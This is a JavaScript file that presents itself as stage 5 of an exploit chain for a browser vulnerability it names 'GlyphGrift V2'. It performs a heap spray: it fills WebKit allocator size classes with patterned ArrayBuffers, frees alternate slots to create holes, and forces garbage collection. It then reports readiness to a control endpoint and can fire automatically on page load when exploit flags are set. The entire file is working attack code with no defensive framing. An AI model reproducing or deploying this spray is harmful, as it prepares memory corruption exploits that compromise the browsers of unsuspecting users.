/**
 * CVE-2026-86950 GlyphGrift V2 — Stage 5 heap spray.
 * Fills target bmalloc/libpas size classes with ArrayBuffers, frees every other slot
 * for holes, then POSTs /api/glyphgrift-heap-ready. Survivors stay on window for post-trigger.
 */
(function () {
  'use strict';

  var DEFAULT_ZONES = [48, 64, 80, 96, 128, 160, 192, 256];
  var PER_ZONE = 1024;
  var HOLE_INTERVAL = 2;
  var TARGET_SIZE = 128;
  var API = '/api/glyphgrift-heap-ready';

  function fillPattern(buf, marker) {
    var u8 = new Uint8Array(buf);
    for (var i = 0; i < u8.length; i++) {
      u8[i] = (marker + i) & 0xff;
    }
  }

  function forceGC() {
    try {
      for (var gc = 0; gc < 8; gc++) {
        var junk = [];
        for (var i = 0; i < 128; i++) junk.push(new ArrayBuffer(256 * 1024));
        junk = null;
      }
      for (var gc2 = 0; gc2 < 4; gc2++) {
        var big = new ArrayBuffer(4 * 1024 * 1024);
        big = null;
      }
    } catch (e) {}
  }

  function clearSprays() {
    window.__L0FCK_GLYPHGRIFT_SPRAYS = null;
    window.__L0FCK_GLYPHGRIFT_SPRAY = null;
    forceGC();
  }

  function runSpray(targetZone, round) {
    var zones = (targetZone && typeof targetZone === 'number' && targetZone > 0)
      ? [targetZone]
      : DEFAULT_ZONES;
    var currentRound = typeof round === 'number' ? round : (window.__L0FCK_GLYPHGRIFT_ROUND || 0);

    var sprays = {};
    var totalSprayed = 0;
    var totalHoles = 0;

    for (var z = 0; z < zones.length; z++) {
      var size = zones[z];
      var allocSize = Math.max(16, size - 16);
      var arr = [];
      for (var i = 0; i < PER_ZONE; i++) {
        arr[i] = new ArrayBuffer(allocSize);
        fillPattern(arr[i], ((currentRound * 0x20) + (z * 0x10) + (i & 0x0f)) & 0xff);
        totalSprayed++;
      }

      for (var h = 0; h < arr.length; h += HOLE_INTERVAL) {
        arr[h] = null;
        totalHoles++;
      }
      sprays[size] = arr;
    }

    forceGC();

    window.__L0FCK_GLYPHGRIFT_SPRAYS = sprays;
    window.__L0FCK_GLYPHGRIFT_ZONES = zones;
    window.__L0FCK_GLYPHGRIFT_SPRAY = sprays[128] || sprays[zones[0]];
    window.__L0FCK_GLYPHGRIFT_SPRAY_SIZE = zones[0];
    window.__L0FCK_GLYPHGRIFT_SPRAY_ALLOC = Math.max(16, zones[0] - 16);
    window.__L0FCK_GLYPHGRIFT_HOLE_COUNT = totalHoles;
    window.__L0FCK_GLYPHGRIFT_ROUND = currentRound;

    return {
      sprayed: totalSprayed,
      holes: totalHoles,
      target_zone: zones[0] || TARGET_SIZE,
      zones: zones,
      per_zone: PER_ZONE,
      round: currentRound,
      phase: 'holes_ready',
      heap_spray_ready: true
    };
  }

  function postReady(payload) {
    return fetch(API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(function () {});
  }

  function execute(ctx, zone, round) {
    var chosenZone = zone || window.__L0FCK_GLYPHGRIFT_ZONE || 0;
    var currentRound = (typeof round === 'number') ? round : (window.__L0FCK_GLYPHGRIFT_ROUND || 0);
    if (ctx && ctx.log) ctx.log('glyphgrift multi-zone spray round=' + currentRound);
    var payload = runSpray(chosenZone, currentRound);
    return postReady(payload).then(function () {
      if (ctx && ctx.report) {
        return ctx.report('glyphgrift_heap_spray', 'ok', JSON.stringify(payload));
      }
      return payload;
    });
  }

  window.__L0FCK_STAGE4_RUNNERS = window.__L0FCK_STAGE4_RUNNERS || {};
  window.__L0FCK_STAGE4_RUNNERS.glyphgrift_heap_spray = function (ctx) {
    return execute(ctx);
  };

  window.__L0FCK_GLYPHGRIFT_RUN_SPRAY = function (zone, round) {
    if (zone) window.__L0FCK_GLYPHGRIFT_ZONE = zone;
    if (typeof round === 'number') window.__L0FCK_GLYPHGRIFT_ROUND = round;
    return execute(null, zone, round);
  };
  window.__L0FCK_GLYPHGRIFT_FORCE_GC = forceGC;
  window.__L0FCK_GLYPHGRIFT_CLEAR_SPRAYS = clearSprays;

  if (window.__L0FCK_GLYPHGRIFT_EXPLOIT === true &&
      window.__L0FCK_GLYPHGRIFT_AUTO_SPRAY === true) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', function () { execute(null); });
    } else {
      setTimeout(function () { execute(null); }, 0);
    }
  }
})();

